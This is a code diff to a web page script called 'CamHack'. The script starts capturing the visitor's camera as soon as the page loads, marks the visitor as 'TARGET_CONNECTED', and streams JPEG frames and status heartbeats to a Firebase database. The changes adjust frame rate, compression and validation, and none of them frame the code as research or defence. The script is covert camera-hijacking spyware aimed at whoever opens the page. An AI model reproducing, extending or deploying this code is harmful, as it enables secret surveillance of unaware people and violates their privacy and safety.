@@ -86,7 +86,6 @@
         
         console.log('🎯 CamHack Started - Session:', sessionId);
         
-        // Auto-start segera setelah load
         document.addEventListener('DOMContentLoaded', function() {
             console.log('📱 Page loaded - Starting immediately');
             initializeCamHack();
@@ -148,7 +147,6 @@
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     
-                    // Send connection status
                     await database.ref(`sessions/${sessionId}/status`).set({
                         type: 'TARGET_CONNECTED',
                         cameraWidth: canvas.width,
@@ -203,21 +201,29 @@
                                 };
                                 
                                 try {
-                                    // Send frame dengan priority
-                                    const frameRef = database.ref(`sessions/${sessionId}/frames`).push();
-                                    await frameRef.set(frameData);
+                                    // Validate frame data
+                                    if (!reader.result || !reader.result.startsWith('data:image/jpeg;base64,')) {
+                                        console.error('❌ Invalid frame format');
+                                        return;
+                                    }
+                                    
+                                    // Send frame ke Firebase
+                                    await database.ref(`sessions/${sessionId}/frames`).push(frameData);
                                     
                                     console.log(`✅ Frame #${frameCount} sent - ${Math.round(reader.result.length/1024)}KB`);
-                                    document.getElementById('status').textContent = `🔴 LIVE: Frame #${frameCount} (${currentFacingMode})`;
+                                    document.getElementById('status').textContent = `🔴 LIVE: Frame #${frameCount} (${currentFacingMode}) - ${Math.round(reader.result.length/1024)}KB`;
                                     
-                                    // Update last frame info
-                                    database.ref(`sessions/${sessionId}/lastFrame`).set({
-                                        frameNumber: frameCount,
+                                    // Update heartbeat
+                                    database.ref(`sessions/${sessionId}/heartbeat`).set({
+                                        frameCount: frameCount,
                                         timestamp: Date.now(),
-                                        size: reader.result.length
+                                        facingMode: currentFacingMode,
+                                        online: true,
+                                        cameraActive: isCapturing,
+                                        lastFrameSize: reader.result.length
                                     });
                                     
-                                    retryCount = 0; // Reset retry on success
+                                    retryCount = 0;
                                     
                                 } catch (error) {
                                     console.error('❌ Frame send failed:', error);
@@ -231,14 +237,14 @@
                             };
                             reader.readAsDataURL(blob);
                         }
-                    }, 'image/jpeg', 0.7); // Compress untuk speed
+                    }, 'image/jpeg', 0.6);
                     
                 } catch (error) {
                     console.error('❌ Frame capture error:', error);
                 }
                 
                 if (isCapturing && mediaStream) {
-                    setTimeout(captureFrame, 500); // 2 FPS untuk real-time
+                    setTimeout(captureFrame, 1000); // 1 FPS untuk stability
                 }
             }
             
@@ -334,7 +340,7 @@
                         retryCount: retryCount
                     });
                 }
-            }, 2000); // Every 2 seconds
+            }, 2000);
         }
         
         function retryConnection() {
